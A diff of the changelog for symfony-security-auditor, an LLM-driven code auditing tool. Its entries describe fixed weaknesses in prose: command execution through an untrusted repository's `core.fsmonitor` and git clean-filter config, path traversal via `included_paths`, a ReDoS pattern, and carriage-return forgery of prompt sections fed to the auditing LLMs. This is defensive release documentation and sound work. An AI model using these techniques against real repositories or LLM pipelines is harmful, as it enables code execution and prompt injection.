-  (`src/Audit/Infrastructure/FileSystem/RegexSecretScrubber.php`) applies each
-  pattern in turn, and when `preg_replace()`/`preg_replace_callback()` returned
-  `null` — the PCRE engine refusing to evaluate a pattern — it did `continue`,
-  moving on to the next pattern with the content unchanged. Nothing downstream
-  could distinguish that part-scanned content from a clean scan, so a file
-  crafted to exhaust `pcre.backtrack_limit` (or a `/u` `additional_patterns`
-  entry meeting invalid UTF-8) sent whatever the failed pattern would have
-  caught straight to the LLM provider. Enabling `scan.secret_scrubbing` is a
-  promise that no credential reaches the model, so the scrubber now fails
-  closed: the file's content is replaced with `***REDACTED:unscannable***`,
-  padded to preserve the original line count so reported line numbers stay
-  correct, and a warning naming the pattern and the `preg_last_error_msg()` is
-  logged. `RegexSecretScrubber` takes an optional `LoggerInterface` second
-  constructor argument, defaulting to `NullLogger`, and is wired to `logger` in
-  `config/services.php`.
-
-- **`aws_secret_access_key: '…'` is redacted, matching what
-  `AWS_SECRET_ACCESS_KEY=…` already did.** The `env_assignment` pattern
-  tolerates segments after the credential word (`(?:_[A-Z0-9]+)*`), which is why
-  the suite already asserted `JWT_PRIVATE_KEY_PATH=…` is redacted, but the
-  `inline_assignment` and `multiline_assignment` patterns required the
-  credential word to be the **last** segment before the separator. The exact
-  same key leaked in YAML, PHP-array and JSON form while being redacted in
-  dotenv form — `aws_secret_access_key`, `secret_key_base`,
-  `client_secret_value` and `private_key_path` all passed through untouched.
-  Both inline patterns now carry the same `(?:[_-][a-z0-9]+)*` tolerance.
-
-- **`PASSPHRASE` / `passphrase` is recognized as a credential word.** Neither
-  the `env_assignment` keyword alternation
-  (`TOKEN|SECRET|PASSWORD|PASSWD|KEY|DSN`) nor the inline one listed it, so
-  `SSH_PASSPHRASE=…` and `passphrase: '…'` — the usual way an SSH or PGP key's
-  passphrase appears in a committed config — were sent verbatim. Added to all
-  three patterns.
-
-- **Azure Storage connection strings, `Authorization: Bearer` headers, and
-  OpenAI-style `sk-`/`sk-proj-` keys, and Slack incoming webhook URLs are now
-  redacted.** `RegexSecretScrubber::DEFAULT_PATTERNS`
-  (`src/Audit/Infrastructure/FileSystem/RegexSecretScrubber.php`) had no pattern
-  for any of these four common credential shapes: an `AccountKey=<base64>`
-  connection-string segment matches neither `env_assignment`'s all-caps keyword
-  rule nor `inline_assignment`'s fixed keyword list (mixed-case, no separator
-  before `Key`); a bare `Bearer <token>` header/curl argument and a bare
-  `sk-`/`sk-proj-` key with no enclosing `key=`/`token=` assignment matched
-  nothing; and a Slack incoming webhook URL is itself the credential, while only
-  OAuth-style `xox*` tokens were covered. All four would have reached the LLM
-  provider and any generated report verbatim. Added `account[_-]?key` to the
-  `inline_assignment`/ `multiline_assignment` keyword alternations, and three
-  new patterns/labels: `bearer_token`, `openai_api_key`, `slack_webhook_url`.
-
-- **A `security.yaml` access-control path or a serialized route/voter/form
-  signature spanning two entries could replay a stale attacker verdict.**
-  `ChunkContextKeyDeriver::mappingFingerprint()`
-  (`src/Audit/Application/Agent/Chunk/ChunkContextKeyDeriver.php`) joined its
-  sorted signature list with `implode("\n", $signatures)` before a single
-  `hash()` call — the same naive-concatenation anti-pattern
-  `Vulnerability::fingerprintOf()`/`generateId()` were already fixed to avoid,
-  just not applied here. A firewall rule, route-access-control, voter, or form
-  signature containing a literal newline (parsed from a double-quoted YAML
-  string) could make two materially different security configurations
-  fingerprint identically, so the `AttackerChunkCache` replayed a "no
-  vulnerability" verdict computed under a different, stale security posture for
-  a file whose own content never changed — a false negative. Each signature is
-  now hashed individually before joining, mirroring `derive()`'s own scheme in
-  the same class.
-
-- **A reviewer-feedback reason containing another entry's exact line could
-  replay a stale accept/reject verdict.** `ReviewerFeedback::digest()`
-  (`src/Audit/Domain/Model/ReviewerFeedback.php`) had the identical
-  naive-concatenation weakness: it joined per-entry `\0`-separated lines with
-  `implode("\n", $lines)` before a single `hash()` call. Since an entry's
-  `title`/`file`/`reason` (LLM- or filesystem-path-sourced) can embed another
-  entry's whole line, two genuinely different feedback sets could digest
-  identically, letting `FilesystemReviewerCache` silently fail to invalidate a
-  verdict after a maintainer's reason change. Each line is now hashed
-  individually before joining, mirroring `ChunkContextKeyDeriver::derive()`.
-
-- **A NUL byte in a `file` or `title` could still shift a value across a field
-  boundary within a single entry, in three places the previous fix round
-  missed.** `ReviewerFeedback::digest()` hashed each entry's whole
-  `type\0file\0title\0reason` line, but not each field before joining it into
-  that line — so `file="A\0B", title="C"` and `file="A", title="B\0C"` produced
-  the byte-identical line, and therefore the same digest, despite being
-  genuinely different feedback. The same idiom, with the same gap, existed in
-  `CompositeReviewerFeedbackProvider::deduplicated()`
-  (`src/Audit/Infrastructure/Prompt/Reviewer/`) — used to merge baseline and
-  triage-memory feedback, where a collision silently drops one finding's
-  guidance — and in `FilesystemTriageMemoryStore::keyOf()`
-  (`src/Audit/Infrastructure/Cache/`) — used to dedupe persisted rejections,
-  where a collision silently drops a reviewer's rejection reason for a genuinely
-  distinct finding. All three now hash `type`, `file`, `title` (and, for the
-  memory store, `line`) individually before joining, matching
-  `ChunkContextKeyDeriver::derive()`.
-
-- **An audited repository's own `scan.included_paths` entry could read and
-  exfiltrate an arbitrary file on the audit host.**
-  `ProjectFileScanner::resolveIncludedPaths()`
-  (`src/Audit/Infrastructure/FileSystem/ProjectFileScanner.php`) resolved each
-  configured path with plain string concatenation
-  (`$projectPath.DIRECTORY_SEPARATOR.$includedPath`), with no check that the
-  result stayed inside the project root. A `scan.included_paths` entry such as
-  `../outside/secret.php` — settable from `config/packages/` in bundle mode, or
-  a target repository's own project config in standalone mode — resolved to a
-  path outside the audited project, and its full contents were then sent to the
-  LLM provider like any other scanned file (past best-effort secret scrubbing,
-  which only redacts known credential shapes, not arbitrary content). A resolved
-  path is now checked against the canonicalized project root and skipped with a
-  warning if it escapes, mirroring the existing symlink-escape guard.
-
-- **A project config can no longer point the SARIF importer at a file of its
-  choosing.** `scan.import_sarif` accepts absolute paths by design (SARIF
-  reports commonly live outside the audited repository, e.g. in a CI artifacts
-  directory), so sandboxing its path resolution the way `included_paths` was
-  fixed above would have broken that legitimate use. Instead,
-  `StandaloneConfigLoader::readProjectConfig()`
-  (`src/Audit/Infrastructure/Config/StandaloneConfigLoader.php`) now rejects a
-  per-project `.symfony-security-auditor.yaml` that declares `scan.import_sarif`
-  at all, the same way it already rejects `platform`/`provider` — the new
-  `ProjectConfigScanOverrideException`. Configure SARIF imports in the trusted
-  user config instead.
-
-- **A `scan.custom_risk_patterns` entry with a catastrophic-backtracking regex
-  had no safeguard, unlike the sibling `secret_scrubbing.additional_patterns`
-  path.** `RegexStaticPreScanner` stored `customPatterns` with no validation
-  and, on a `preg_match()`/`preg_match_all()` failure (e.g.
-  `pcre.backtrack_limit` exhausted), silently treated it the same as "no match"
-  — reproduced directly: a classic `(a+)+$` pattern against a ~30-character
-  attacker-controlled line exhausts the default backtrack limit in a couple of
-  milliseconds, and since the pattern re-runs per line of every matching file, a
-  repository-supplied pattern plus repository-supplied content scales that into
-  a meaningful CPU-exhaustion DoS against the audit run itself. Each custom
-  pattern is now validated at construction — an empty or syntactically invalid
-  pattern throws the new `InvalidCustomRiskPatternException` — and a runtime
-  evaluation failure now logs a warning and stops evaluating that pattern for
-  the rest of the file, instead of silently repeating a failing, CPU-costly call
-  once per remaining line.
-
-### Fixed
-
-- **A crafted file path could still forge a fake prompt section using a carriage
-  return instead of a newline.** `AttackerPromptBuilder::sanitizePathLine()` and
-  `NumberedFileContextRenderer::sanitizePathAttribute()`
-  (`src/Audit/Infrastructure/Prompt/`) stripped `\n` from a scanned file's path
-  before embedding it in the attacker prompt, but left `\r` untouched — half of
-  the same defense `AttackerContextPromptRenderer::sanitizeLine()` already
-  applies to risk-marker and prior-finding text. Both now strip `\r` alongside
-  `\n`.
-
-- **A purely-numeric `file_path` crashed the executive summary report.**
-  `ExecutiveSummary::fileCounts()`
-  (`src/Audit/Domain/Model/ExecutiveSummary.php`) keys its hotspot distribution
-  by the LLM-controlled `file_path`, and a canonical-integer string (e.g.
-  `"42"`) becomes an `int` array key under PHP's own array-key rules.
-  `ExecutiveSummaryReportRenderer::countLines()`
-  (`src/Audit/Infrastructure/Report/`) passed that key straight into
-  `sanitize(string $text)`, so `audit:run --format executive` aborted with a
-  `TypeError` the moment any validated finding's file path looked like a number.
-  The label is now cast to `string` before sanitizing.
-
-- **A Unicode bidirectional override in a finding's title survived into the
-  SARIF and JUnit reports.** Neither `SarifReportRenderer::resultFor()` nor
-  `JunitReportRenderer::stripIllegalXmlCharacters()`
-  (`src/Audit/Infrastructure/Report/`) stripped bidi control characters — a bidi
-  override is valid JSON text and valid XML text, so it survived round-tripping
-  into `message.text` (SARIF) and the testcase name/failure text (JUnit)
-  unchanged, letting a crafted finding visually reorder how its own title reads
-  in GitHub Code Scanning or a JUnit-consuming CI viewer. Both renderers now run
-  the affected fields through the same
-  `TerminalTextSanitizer::stripControlCharacters()` the console and Markdown
-  renderers already use.
-
-- **The carriage-return fix above missed three sibling functions that render the
-  same class of attacker-controlled value.**
-  `SymfonyMappingContextRenderer::sanitizeLine()`
-  (`src/Audit/Infrastructure/Prompt/SymfonyMappingContextRenderer.php`) renders
-  a voter's `supports()` string-literal attributes/subjects and
-  `security.yaml`-derived firewall-rule strings — both attacker-controlled — and
-  `ReviewerMessageRenderer::sanitizeFilePath()` / `stripEmbeddedNewline()`
-  (`src/Audit/Infrastructure/Prompt/Reviewer/`) render the attacker LLM's own
-  `file_path` and `title` tool-call arguments. All three stripped `\n` but left
-  a bare `\r` untouched, reopening the same fake `##`-prefixed-section forgery
-  the file-path fix above closed. All three now strip `\r` alongside `\n`.
-
-- **The bidi-override fix above could be bypassed by a single invalid UTF-8 byte
-  anywhere in the same title.**
-  `TerminalTextSanitizer::stripControlCharacters()` runs a `/u`-mode regex,
-  which PHP aborts (returns `null`, silently falling back to the original,
-  unstripped text) the moment its subject contains one invalid byte — every
-  sibling renderer (`HtmlReportRenderer::escape()`, `MarkdownTextEscaper`,
-  `GithubAnnotationsReportRenderer::escapeData()`) already guards against this
-  by scrubbing with `mb_scrub($value, 'UTF-8')` first, but
-  `SarifReportRenderer::resultFor()`
-  (`src/Audit/Infrastructure/Report/SarifReportRenderer.php`) did not, so a
-  title combining one stray byte with a genuine bidi override reached SARIF's
-  `message.text` with the override intact. `resultFor()` now scrubs the title
-  the same way before stripping control characters.
-
-- **Auditing an untrusted repository with `--since` could execute an
-  attacker-controlled command.** `ProcessGitChangedFilesResolver` runs
-  `git diff` with the audited project as its working directory
-  (`src/Audit/Infrastructure/Diff/ProcessGitChangedFilesResolver.php`), so the
-  audited repo's own local `.git/config` — attacker data, not ours — is honored
-  by that `git` invocation. A `core.fsmonitor` entry there names an arbitrary
-  command git runs on any working-tree comparison, including the plain
-  `git diff --name-only HEAD` this resolver issues for uncommitted changes,
-  letting a malicious clone execute code as the auditor's own process the moment
-  `audit:run --since=<ref>` runs against it. `buildDefaultGitDiffProcess()` now
-  passes `-c core.fsmonitor=` alongside the existing `-c core.quotepath=off`,
-  neutralizing the hook the same way.
-
-- **The `core.fsmonitor` fix above still left a second, equally exploitable
-  command-execution path through the audited repo's own git config.** A
-  `.gitattributes` `filter=<name>` assignment plus a matching
-  `filter.<name>.clean` command in the same untrusted `.git/config` reaches an
-  arbitrary command too — git runs the clean filter to normalize a working-tree
-  file before comparing it against the index, which the plain
-  `git diff --name-only HEAD` this resolver used for uncommitted changes
-  triggers for any file whose stat info looks changed. Neither
-  `-c core.fsmonitor=` nor `-c core.attributesFile=` block it, since the driver
-  name is attacker-chosen and the repo's own `.gitattributes` is always honored
-  regardless of that setting. `ProcessGitChangedFilesResolver::changedSince()`
-  (`src/Audit/Infrastructure/Diff/ProcessGitChangedFilesResolver.php`) now gets
-  the same "uncommitted changes" information from `git diff-index --cached HEAD`
-  (index vs tree) plus `git diff-files` (working tree vs index) instead of
-  `git diff HEAD` — both plumbing commands answer the same "did this file
-  change" question without ever invoking a content filter.
-
-- **The MCP `audit` tool resolved advisories, SARIF imports, and triage cache
-  entries against the bundle's own directory instead of the audited project.**
-  `AuditCommand` sets `AuditedProjectPathHolder` from the resolved CLI argument
-  before running (`src/Command/AuditCommand.php`), but `AuditTool::audit()`
-  (`src/Command/Mcp/AuditTool.php`) never did the equivalent for its own `path`
-  argument, so `ComposerAuditAdvisoryDatabase`, `SarifImportingPreScanner` and
-  `FilesystemTriageMemoryStore` — all of which read
-  `AuditedProjectPathHolder::path()` — fell back to `kernel.project_dir`
-  whenever the tool was invoked over MCP rather than `audit:run`. `AuditTool`
-  now sets the holder from its own `path` argument before delegating to
-  `RunAuditUseCase`, matching the command's behavior.
-
-- **That MCP path fix above copied `AuditCommand`'s call but not its
-  normalization.** `AuditCommandInput::resolvedProjectPath()`
-  (`src/Command/AuditCommandInput.php`) canonicalizes an absolute CLI argument
-  via `Path::canonicalize()` before anything downstream sees it, but
-  `AuditTool::audit()` passed the MCP tool's raw `path` argument straight
-  through — a relative path silently reached `Process`'s `$cwd` in
-  `SymfonyProcessComposerAuditRunner`, a `..`-bearing absolute path hashed to a
-  different triage-cache key than its canonical form, and
-  `SarifImportingPreScanner::normalizeUri()` silently failed to strip a
-  non-canonical prefix from imported SARIF artifact URIs. `AuditTool` now
-  rejects a non-absolute `path` with the new `InvalidProjectPathException`
-  (`src/Command/Exception/InvalidProjectPathException.php`) and canonicalizes an
-  absolute one before setting the holder, matching the CLI path exactly.
-
-- **A public marker string let any PR commenter hijack the action's own report
-  comment.** `comment-pr` (`action.yml`) finds the comment to edit in place by
-  matching a body marker that is visible in this repository's own source, with
-  no check on who posted it — so a PR author (or anyone else able to comment)
-  could post that marker first and have the job's `pull-requests: write` token
-  edit their comment on every subsequent rerun instead of posting its own. The
-  `jq` selector now also requires `.user.login == "github-actions[bot]"`.
-
-- **A negative token count from the LLM provider could permanently defeat the
-  configured rate limit for the rest of its window.** The only place that
-  rejected a negative token count was `TokenUsageRecorder::record()`, reached
-  through `PlatformResultExtractor::extractTokens()`'s optional
-  `$tokenUsageRecorder` collaborator
-  (`src/Audit/Infrastructure/LLM/PlatformResultExtractor.php`) — but
-  `PlatformAccountingConfig` defaults that collaborator to `null`, a legitimate,
-  supported configuration. Built without one, `extractTokens()` returned an
-  unvalidated negative value straight to `RateLimiterInterface::record()`
-  (`src/Audit/Infrastructure/LLM/RateLimit/TokenBucketRateLimiter.php`), whose
-  mutable window counters have no lower bound of their own — a single malformed
-  or compromised provider response could drive the counter deeply negative,
-  silently suppressing the input-tokens-per-minute limit for the rest of that
-  window regardless of how much real traffic followed. `extractTokens()` now
-  validates all four token counts itself, unconditionally, before any caller
-  ever sees them.
-
-- **`audit.budget.max_tokens` did not bound a run's real token spend once
-  provider prompt caching was involved.** `LLMResponse::totalTokens()`
-  (`src/Audit/Domain/Port/LLMResponse.php`) returned only
-  `inputTokens + outputTokens`, and `BudgetTracker::recordCall()`
-  (`src/Audit/Application/Budget/BudgetTracker.php`) sums exactly that value to
-  compare against the configured cap — so a call's `cacheReadTokens` and
-  `cacheCreationTokens` were consumed, billed (`CostCalculator::costForCall()`
-  already prices all four counters correctly), and never counted toward the cap
-  that is supposed to abort the run. A caching-heavy audit — the default, since
-  `cache.enabled` is on — could run well past a configured
-  `audit.budget.max_tokens` without ever tripping `BudgetExceededException`.
-  `totalTokens()` now sums all four counters. Fixing a run's token accounting
-  means `audit.budget.max_tokens` now trips earlier than it used to appear to,
-  which is the guard working correctly for the first time, not a change to what
-  the option promises.
-
-- **A persisted attacker chunk cache entry could outlive the mapping it was
-  computed under.** `ChunkContextFactory::create()` derives a chunk's cache key
-  from file content plus a `contextKey` hashed from the marker/rejected/previous
-  preambles, but `AttackerPromptBuilder::buildUserMessage()` also folds the
-  `SymfonyMapping` — firewall rules, the route access-control map, voter
-  coverage, form bindings, controllers without a voter — straight into the
-  prompt, and none of that ever reached the key
-  (`src/Audit/Application/Agent/Chunk/ChunkContextFactory.php`). A
-  `security.yaml` edit or a voter added elsewhere in the project could leave a
-  specific file's own content untouched while changing whether the attacker
-  would flag it — and `FilesystemAttackerCache` would keep serving the verdict
-  computed under the old mapping indefinitely.
-  `ChunkContextKeyDeriver::derive()`
-  (`src/Audit/Application/Agent/Chunk/ChunkContextKeyDeriver.php`) now folds in
-  a fingerprint of that same access-control data, sorted before hashing so two
-  scans of an unchanged codebase still agree despite `Finder` making no ordering
-  guarantee, and stays the empty string when the mapping carries none of it — so
-  a mapping-less test double or a project with no routes at all keeps today's
-  full cacheability. A custom, non-context-aware `AttackerCacheInterface`
-  implementation will now see chunks skipped (per the existing, documented
-  fallback) far more often than before, since a real Symfony project's mapping
-  is rarely empty — the alternative was letting such a cache keep serving stale
-  verdicts, which is the exact bug this closes.
-
-- **A finding whose LLM tool call omitted `line_start` could silently overwrite
-  an unrelated finding.** `Vulnerability`'s id is deterministic —
-  `VULN-{sha1(type+filePath+lineStart)[0..7]}` — and `line_start` was absent
-  from `record_vulnerability`'s `required` list
-  (`src/Audit/Infrastructure/Tool/RecordVulnerabilityTool.php`), so the provider
-  accepted a tool call that omitted it.
-  `VulnerabilityFactory::buildVulnerability()` then defaulted the missing value
-  to `1`, and `AuditContext::addVulnerability()` keys its findings map by id —
-  so two distinct findings of the same type in the same file collided onto one
-  id the moment either omitted `line_start`, and only the last one written to
-  the map survived. `line_start` is now required, so the provider validates
-  every tool call against it before invocation and the omission is structurally
-  impossible, matching how `confidence` and `title` were already required for
-  the same reason. `line_end` stays optional — it legitimately defaults to
-  `line_start` for a single-line finding and plays no part in the id.
-
-- **An audit that examined no files no longer reports a clean bill of health.**
-  A run whose scan found nothing — a mistyped `project-path`, a
-  `scan.included_paths` entry matching no directory, an over-broad
-  `excluded_paths` — produced a report with zero findings, and every downstream
-  signal read that as success: `riskLevel` SAFE, `normalizedScore()` 100, grade
-  A, and `AuditExitCodeResolver::resolve()` returning `0` even under
-  `--fail-on=low --min-score=90`. A CI gate configured exactly as the docs
-  recommend went green having audited nothing. `ReportIdentity` now also carries
-  `filesDiscovered` — what the scan found, before a `--since` diff narrows it —
-  exposed as `AuditReport::filesDiscovered()`, and the resolver fails a run
-  whose value is `0` regardless of the thresholds. A `--since` run whose diff
-  left nothing changed still exits `0`, because there the scan did find files;
-  the two cases were previously indistinguishable, since `filesScanned` is the
-  post-diff count.
-
-- **A failing audit no longer blames the `--fail-on` threshold for a
-  `--min-score` failure.** `AuditExitCodeResolver::resolve()` fails a run when
-  the risk gate **or** the independent `--min-score` gate trips, but only the
-  resulting exit code reaches `AuditPresenter::result()`, which unconditionally
-  printed `Audit completed at or above the fail-on threshold. Risk: %s.` So
-  `audit:run --fail-on=critical --min-score=96` against a project with one
-  MEDIUM finding (risk `LOW`, score 95) reported a fail-on breach that had not
-  happened, pointing engineers at a risk-level regression that did not exist.
-  The message now reads
-  `Audit failed a configured gate. Risk: %s. Score: %d/100.` — naming neither
-  gate and surfacing both gated values, matching what `audit:run --help` already
-  documented.
-
-- **Standalone configuration resolves `%env(...)%` placeholders outside the
-  `platform` block.** `StandaloneConfigLoader::load()` splits the raw YAML into
-  a platform block and everything else (`array_diff_key($rawConfig, ...)`), and
-  only the platform block was env-expanded — by
-  `StandalonePlatformConfigResolver::resolveValue()`. The remaining audit
-  configuration reached the container verbatim, where
-  `StandaloneContainerFactory` built its `ContainerBuilder` with a plain
-  `ParameterBag`, which has no env-placeholder machinery at all. A standalone
-  config declaring `model: '%env(SSA_MODEL)%'` therefore aborted with:
-
-  ```text
-  The parameter "symfony_security_auditor.attacker_model" has a dependency on a non-existent parameter "env(SSA_MODEL)".
-  ```
-
-  even though `symfony-security-auditor init` itself writes `%env(...)%` into
-  that same file for the platform API key and so presents it as the idiom for
-  the whole config. `StandaloneContainerFactory` now uses an
-  `EnvPlaceholderParameterBag` and compiles with
-  `ContainerBuilder::compile(true)`, so every `%env(...)%` in a standalone
-  config resolves at compile time. Configs that only used `%env(...)%` for the
-  platform API key are unaffected — that path was already resolved before
-  reaching the container.
-
-- **CI resolves the root package version deterministically.** Restoring
-  `extra.branch-alias` was not enough: an alias only applies when its key
-  matches the branch Composer manages to infer, and `actions/checkout` produces
-  a depth-1 detached-HEAD checkout with no reachable tags, so the inference —
-  and with it the alias — is unreliable. `todoBy.sfDeprecation` kept reporting
-  the three 1.13 deprecations on `1.x`. `.github/workflows/ci.yaml` now pins
-  `COMPOSER_ROOT_VERSION: 1.0.x-dev` at workflow level, which sets the root
-  version directly and skips inference altogether, and the `Lint` job asserts
-  the resolved version is below the oldest live deprecation before running
-  PHPStan — so a future drift names itself instead of appearing as three
-  unexplained errors.
-- **CI is green on `1.x` again after `extra.branch-alias` was removed.**
-  Removing it turned every job red — `Lint` on PHPStan, and all nine
-  `Tests + Mutation` legs because Infection runs PHPStan as its static-analysis
-  tool and inherits the same failure. `staabm/phpstan-todo-by`'s
-  `todoBy.sfDeprecation` rule reads the **installed root version** through
-  `Composer\InstalledVersions` and reports every `trigger_deprecation()` whose
-  since-version that root version satisfies; with no alias the root version is
-  the branch name and the three 1.13 deprecations in `SymfonyMapping::create()`,
-  `Vulnerability::create()` and `LLMResponse::create()` were all reported. The
-  alias is restored for both branch keys, and `docs/versioning.md` now records
-  why its value has to stay below the oldest live deprecation so it is not
-  "corrected" into breaking the build again. Removing those three factories is
-  the real fix and belongs to a `MAJOR`.
-- **The standalone binaries are published with releases again.** 1.18.0 added
-  `"ext-uri": "*"` to `composer.json` — satisfied on PHP 8.3/8.4 by
-  `league/uri-polyfill`, which declares `provide: {"ext-uri": "*"}` — and
-  `spc dump-extensions`, which collects every `ext-*` requirement in
-  `composer.json`/`composer.lock` and never reads `provide`, emitted `uri` into
-  the list handed to `spc download --for-extensions`. `static-php-cli` 2.8.5 has
-  no `uri` package to build (PHP only gained the extension in 8.5; the release
-  targets 8.3), so all five legs of the binary matrix aborted within a second of
-  starting the build with "`Extension [uri] not exist !`" and the 1.18.0 release
-  carried no binaries at all. `.github/workflows/release.yaml` now drops `uri`
-  alongside the always-compiled core extensions before the list reaches spc; the
-  polyfill shipped inside the PHAR supplies `Uri\Rfc3986\Uri` at runtime,
-  exactly as it already does for the PHP 8.3/8.4 test matrix.
-- **`Vulnerability::generateId()` could collide two distinct findings.**
-  `src/Audit/Domain/Model/Vulnerability.php` hashed
-  `$vulnerabilityType->value.$filePath.$lineStart` with no delimiter between the
-  fields, so a digit could shift across the `filePath`/`lineStart` boundary and
-  still hash identically — e.g. `filePath: 'src/Foo1'` with `lineStart: 23` and
-  `filePath: 'src/Foo'` with `lineStart: 123` both concatenate to
-  `sql_injectionsrc/Foo123` and produced the same `VULN-…` id. `generateId()`
-  now hashes each field individually before joining them
-  (`sha1(sha1(type).sha1(filePath).sha1(lineStart))`), mirroring
-  `ChunkContextKeyDeriver::derive()` — each hash is a fixed 40-hex-char string,
-  so no join-boundary shift can collide. This is a `PATCH`, not a `MAJOR`:
-  `id()` is a per-run, human-display-only value (shown in the console/HTML
-  reports and used only as an in-memory dedup key within a single run) — it is
-  absent from the JSON and SARIF schemas, and baseline suppression persists
-  across runs via the separate, already-delimited `fingerprint()`
-  (`'%s|%s|%s'`), which this change does not touch.
+- `audit:run` no longer runs the audited project's Composer scripts or plugins during the advisory lookup (`composer audit` now gets `--no-scripts` and `--no-plugins`); with an earlier release, assume the project's Composer scripts ran ([#277](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/277))
+- The scan segfault on a line with thousands of `/**/` pairs and the quadratic stall on long `$this->helper()` call chains are gone, with identical slicing and mapping output ([#301](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/301), [#297](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/297))
+- A finding title can no longer ping a GitHub account through the pull request comment (`@` is entity-encoded), and a `|` in a file path can no longer forge a table column ([#276](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/276))
+- Finding fingerprints are computed field by field, so a crafted `title` or `filePath` can no longer share a fingerprint with an unrelated finding and suppress it through the baseline or the CI gate ([#294](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/294))
+- Cache keys and digests for the security mapping, reviewer feedback, merged feedback and the triage memory are hashed field by field, so two different inputs can no longer produce the same key and replay a stale verdict ([#303](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/303))
+- The release pipeline verifies the SHA-256 of the `static-php-cli` download before running it ([#296](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/296))
+- `FrameworkVocabulary` carries the framework name, template language and idiomatic fixes the PoC and fix synthesizers interpolate into their prompts, as an optional fourth constructor argument defaulting to Symfony ([#268](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/268))
+- `ApplicationSecurityMap` exposes the project survey under framework-neutral names (`entrypoints()`, `authorizationRules()`, `perimeterRules()`, …) and `SurfaceArchetype` gives every scanned file a framework-neutral shape through `ProjectFile::archetype()`; both are additive ([#267](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/267), [#266](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/266))
+- `RegexCodeSlicer` is split into single-responsibility collaborators with identical output ([#302](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/302))
+- The release installers (`install.sh`, `install.ps1`) and `resources/schema.json` are attached to each release as assets; the documented URLs still point at `main` ([#254](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/254))
+- `main` holds exactly the latest release, development happens on `1.x`, and every pull request declares a target branch that the new `Pull request target` workflow checks against its base ([#254](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/254))
+- CI runs on pushes to version branches such as `2.x`, and resolves the root package version deterministically through `COMPOSER_ROOT_VERSION` ([#254](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/254), [#256](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/256), [#255](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/255))
 
 ## [1.18.0] — 2026-07-26 — Airgap
 
-A release about auditing on your own terms — privately, and legibly. The new
-`privacy.offline_only` mode lets the auditor run fully air-gapped: it refuses
-every network call it owns, and in standalone mode aborts before the container
-boots if any configured platform endpoint would leave the machine. The new
-`executive` format distils a run into a one-screen, stakeholder-facing summary
-with no per-finding detail, and the HTML report now draws its severity and type
-distributions as self-contained inline-SVG charts that follow the reader's
-light/dark theme. A pre-release bug hunt rounds it out — hardening the offline
-guard against IPv4-mapped IPv6 endpoints, stopping the executive summary
-contradicting itself on low-severity reports, and fixing concurrent analysis
-silently dropping files after a batch error.
+### New Features ✨
 
-### Added
+- `audit:run --format=executive` renders a one-screen stakeholder summary: risk level and score, a business-impact sentence, and findings by severity, by type and the five most-affected files, with no per-finding detail and no extra LLM call; a report with only low-impact findings reads "Negligible business exposure" ([#214](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/214), [#224](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/224))
+- `privacy.offline_only: true` makes the auditor refuse every network call it owns: no `composer audit` advisory lookup, and the standalone binary aborts before booting if a platform endpoint is not loopback, link-local or private-range, IPv4-mapped IPv6 hosts included; in bundle mode the platform in `ai.yaml` stays yours to check ([#215](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/215), [#223](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/223))
+- The HTML report gains a "Distribution" section with self-contained inline-SVG bar charts of findings by severity and by vulnerability type that follow the reader's light/dark theme, and no longer prints the "Summary by severity" table that repeated the same counts ([#216](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/216), [#221](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/221))
 
-- **A new `executive` output format summarizes an audit for stakeholders.**
-  `audit:run --format=executive` renders the risk level and score, a one-line
-  business-impact framing of that level, and three distributions — findings by
-  severity, by vulnerability type, and the five most-affected files — with no
-  per-finding technical detail (description, attack vector, proof and PoC stay
-  in `--format=console`). The distributions come from the new `ExecutiveSummary`
-  domain model (`src/Audit/Domain/Model/`), computed from the report already in
-  memory, so the format costs no extra LLM call. Rendered by
-  `ExecutiveSummaryReportRenderer` (`src/Audit/Infrastructure/Report/`);
-  LLM-sourced file paths are control-character- and bidi-stripped through
-  `TerminalTextSanitizer` exactly as the console report does.
-- **New `privacy.offline_only` refuses every network call the auditor owns.**
-  With `privacy.offline_only: true`, the advisory feed is replaced by
-  `InMemoryAdvisoryDatabase`, so `composer audit` is never executed and
-  `lookup_advisory` always answers "no advisories". In standalone mode
-  `OfflineOnlyPlatformGuard` (`src/Audit/Infrastructure/Config/`) additionally
-  checks the configured platforms before the container boots, parsing each
-  endpoint with PHP 8.5's RFC 3986 URI API (`Uri\Rfc3986\Uri`, backported to
-  8.3/8.4 by `league/uri-polyfill`) rather than `parse_url()`: every provider
-  must carry at least one endpoint and every endpoint must be loopback,
-  link-local or private-range, so a hosted provider (an `api_key` and nothing
-  else) or a cloud `base_url` aborts the run with
-  `NonLocalPlatformEndpointException` naming the provider instead of shipping
-  source code off the machine. In bundle mode the platform lives in the
-  application's own `ai.yaml`, which the auditor cannot inspect, so that half
-  stays the operator's responsibility — documented, not silently implied. Model
-  pricing was already network-free (read from the `symfony/models-dev` catalog
-  in `vendor/`). `docs/faq.md` gains a `tcpdump` recipe for verifying the claim
-  rather than trusting it.
-- **The HTML report now charts how findings are distributed.** Every
-  `--format=html` report with at least one finding gains a "Distribution"
-  section holding two inline-SVG horizontal bar charts — findings by severity
-  (color-coded per severity) and by vulnerability type. The charts are drawn by
-  `DistributionBarChart` (`src/Audit/Infrastructure/Report/`) with no external
-  stylesheet, font, image or script, so the report stays a single shareable
-  file, and their colors come from the report's own stylesheet so they follow
-  the reader's light/dark preference. A report with no findings renders no
-  charts.
+### Bugfixes 🐛
 
-### Changed
-
-- **The HTML report no longer repeats the severity counts.** The "Summary by
